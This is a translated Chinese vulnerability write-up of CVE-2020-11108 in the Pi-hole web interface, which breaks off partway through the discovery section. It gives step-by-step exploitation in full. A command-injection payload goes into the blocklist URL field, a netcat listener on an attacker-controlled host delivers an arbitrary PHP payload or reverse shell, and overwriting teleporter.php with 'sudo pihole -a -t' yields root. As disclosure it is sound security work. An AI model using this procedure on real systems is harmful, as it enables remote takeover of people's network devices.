原文地址：
以下是CVE-2020-11108的writeup，Pi-hole
Web应用程序的认证用户可以通过CVE-2020-11108漏洞实现远程代码执行并提权为root。此漏洞影响Pi-hole
v4.4及更低版本。这是我使用多年的一个开源项目中，一个令人兴奋的发现。
所有漏洞都是通过手动代码审计发现。请注意，技术上来讲有两条路径可以获取远程代码执行，但是它们是相似的，并且依赖于同一个易受攻击的函数调用。
这篇文章分为两部分，第一部分简要概述如何利用这些漏洞，第二部分是漏洞的发现和技术分析。
完整的PoC利用在[这里](https://github.com/frichetten/CVE-2020-11108-PoC "这里")。
# Manual Steps to Exploit
**可靠的RCE** ：此漏洞利用方式不依赖任何特殊条件，只需要通过应用程序的身份验证，并且在默认安装的Pi-hole中有效。
**步骤1** ：打开"Settings > Blocklists"
**步骤2** ：禁用当前所有的拦截列表（加快速度），然后输入以下payload作为新URL。  
`http://192.168.122.1#" -o fun.php -d "`  
其中的IP地址是您所控制的地址。请注意，`＃`是必需的，并且`-d`之后的空格也是必需的。输入后点击保存。
**步骤3** ：使用netcat监听80端口（可以修改payload以支持其他端口，但是更改后对'：'字符的一些后端解析更令人烦恼，不值得更改）
**步骤4** ：点击"Save and Update"
**步骤5**
：几秒钟后，将会收到一个GET请求。返回一个200响应（这是必需的），按下回车，输入任意内容（只是为了提供一些数据），再按两次回车，然后Ctrl+c。  
**步骤6**
：再使用netcat监听80端口，然后点击"Update"再次更新Gravity。这次应该会在响应中看到“.domains”，这表明到目前为止都正确完成了漏洞利用。按下回车，然后粘贴你想用的任意PHP
payload。调用Shell函数非常好用，然后Ctrl+c kill掉netcat。  
**步骤7** ：如果你用的payload是一个反弹shell，请设置监听器。然后curl `/admin/scripts/pi-hole/php/fun.php`。这将触发payload。恭喜，你刚刚已在Pi-hole上实现了RCE！  
**有条件的RCE** ：为了利用此漏洞，除了要通过Web应用程序认证之外，Pi-hole服务还必须将其[BLOCKINGMODE](https://docs.pi-hole.net/ftldns/blockingmode/
"BLOCKINGMODE")配置设置为NXDOMAIN。将在技术分析中对此进行详细说明。
**步骤1** ：打开“Settings > Blocklists”
**步骤2** ：禁用当前所有的拦截列表（加快速度），然后输入以下payload作为新URL。  
`http://192.168.122.1#" -o fun.php -d "`  
其中IP地址是您所控制的地址。请注意，`＃`是必需的，并且`-d`之后的空格也是必需的。输入后单击保存。
**步骤3** ：使用netcat监听80端口（可以修改payload支持其他端口，但是更改后对'：'字符的一些后端解析更令人烦恼，不值得更改）
**步骤4** ：点击“Save and Update”
**步骤5**
：几秒钟后，你将会收到一个包含':80:'的GET请求。这表明BLOCKINGMODE已设置为NXDOMAIN，并且已成功利用该漏洞。按下回车，然后粘贴你想用的任意PHP
payload。调用Shell函数非常好用，然后Ctrl+c kill掉netcat。  
**步骤6** ：如果你用的payload是一个反弹shell，请设置监听器。然后curl `/admin/scripts/pi-hole/php/fun.php`。这将触发payload。恭喜，你刚刚已在Pi-hole上实现了RCE！
**权限提升** ：在获得一个shell后，你可以通过以下方式提升权限。
**步骤1** ：重新执行上述任意一个漏洞利用方式，这次将覆盖teleporter.php（而不是写入fun.php）。  
`http://192.168.122.1#" -o teleporter.php -d "`
**步骤2** :使用之前获得的shell，运行`sudo pihole -a -t`（www-data有一个sudo规则来调用pihole），该命令将以root身份调用teleporter.php。如果你已经使用反弹Shell
payload（如上面的例子）将其覆盖，那么你将获得root权限。  
# Discovery
最初的发现纯属偶然。在之前的[文章](https://frichetten.com/blog/escalating-deserialization-attacks-python/
"文章")中，我介绍了如何对Python执行反序列化攻击。作为后续，我想在PHP应用程序中复制这一点。在写那篇文章时（我发誓它终将到来！），我开始研究我在家庭网络上运行的一些使用
PHP 的应用程序。
经过反复挑选后，我最终选择了Pi-hole实例。如果你以前从未用过，Pi-hole是一个专用的DNS服务器，设备可以使用它来拦截广告和恶意域名。有了它，你可以轻松地在整个网络范围内屏蔽广告，而不必依赖浏览器插件之类的东西。
我开始查看[代码](https://github.com/pi-hole/AdminLTE
"代码")，寻找实施反序列化攻击的机会，但最终非常失望（没有一个可以利用的反序列化函数）。我的下一个想法是寻找机会利用[phar stream
wrappers](https://cdn2.hubspot.net/hubfs/3853213/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-....pdf "phar stream
wrappers")。在仔细查看app时，我注意到可以使用用户选择的拦截列表（Settings > Blocklists）。
我测试了一个phar stream wrapper，似乎可以利用（剧透警告：不能）。  
看到这一点后，我心想：“好吧，我们可以定义协议（例如，http vs
https）。我敢打赌后端的PHP会向这些域名发出GET请求，提取内容，然后添加到拦截列表中。我想知道它是否会处理这种phar stream
wrapper？”。
我拉取了程序源代码，很惊讶地发现情况并非如此。相反，PHP实际上调用pihole